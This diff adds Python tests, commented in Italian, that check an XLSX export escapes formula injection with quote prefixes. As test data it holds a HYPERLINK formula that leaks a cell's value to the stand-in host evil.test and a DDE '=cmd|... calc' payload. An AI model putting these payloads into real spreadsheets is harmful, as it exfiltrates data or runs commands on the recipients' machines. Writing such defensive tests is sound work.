@@ -128,3 +128,67 @@ class BrandHeaderLogoResizeTests(TestCase):
         img = ws._images[0]
         self.assertEqual(img.height, 36)
         self.assertEqual(img.width, 43)
+
+
+class XlsxFormulaInjectionTests(TestCase):
+    """Le stringhe non devono MAI diventare formule vive nel file prodotto.
+
+    openpyxl tipizza in base al valore: una stringa che inizia con "=" verrebbe
+    scritta come formula (data_type 'f'). I dati degli export arrivano dal DB e
+    dalla querystring (l'etichetta filtri riflette ?q=), quindi sono controllabili
+    da un attaccante.
+    """
+
+    def _sheet(self, **kwargs):
+        data = build_xlsx_bytes(**kwargs)
+        return load_workbook(BytesIO(data)).active
+
+    def test_string_starting_with_equals_is_not_a_live_formula(self):
+        ws = self._sheet(
+            columns=["Nome"],
+            rows=[["=HYPERLINK(\"http://evil.test?d=\"&A2,\"clicca\")"]],
+        )
+        cell = ws.cell(row=2, column=1)
+        self.assertNotEqual(cell.data_type, "f")
+        self.assertEqual(cell.data_type, "s")
+        self.assertTrue(cell.quotePrefix)
+
+    def test_all_dangerous_prefixes_are_neutralized(self):
+        pericolose = ["=1+1", "+1", "-1+1", "@SUM(A1)", "\tx", "\rx"]
+        ws = self._sheet(columns=["V"], rows=[[v] for v in pericolose])
+        for i, v in enumerate(pericolose, start=2):
+            cell = ws.cell(row=i, column=1)
+            self.assertNotEqual(cell.data_type, "f", f"{v!r} scritta come formula")
+            self.assertTrue(cell.quotePrefix, f"{v!r} senza quote prefix")
+
+    def test_value_is_not_altered(self):
+        # Nessun apice aggiunto al contenuto: -12,50 resta -12,50.
+        ws = self._sheet(columns=["Importo"], rows=[["-12,50"]])
+        self.assertEqual(ws.cell(row=2, column=1).value, "-12,50")
+
+    def test_non_string_values_stay_typed(self):
+        ws = self._sheet(columns=["N"], rows=[[42], [3.5]])
+        self.assertEqual(ws.cell(row=2, column=1).value, 42)
+        self.assertEqual(ws.cell(row=3, column=1).value, 3.5)
+        self.assertNotEqual(ws.cell(row=2, column=1).data_type, "s")
+
+    def test_filters_label_from_querystring_is_neutralized(self):
+        # L'etichetta filtri riflette la querystring: e' la superficie piu' esposta.
+        # Il quote prefix scatta solo se la stringa INIZIA con un carattere
+        # pericoloso; in ogni caso non deve mai diventare una formula viva.
+        ws = self._sheet(
+            columns=["X"], rows=[["ok"]], title="Report",
+            filters_label='=cmd|\' /c calc\'!A1',
+        )
+        cell = ws.cell(row=5, column=1)
+        self.assertNotEqual(cell.data_type, "f")
+        self.assertTrue(cell.quotePrefix)
+
+    def test_filters_label_with_safe_prefix_is_text_without_quote_prefix(self):
+        ws = self._sheet(
+            columns=["X"], rows=[["ok"]], title="Report",
+            filters_label='Ricerca: "=1+1"',
+        )
+        cell = ws.cell(row=5, column=1)
+        self.assertEqual(cell.data_type, "s")
+        self.assertFalse(cell.quotePrefix)
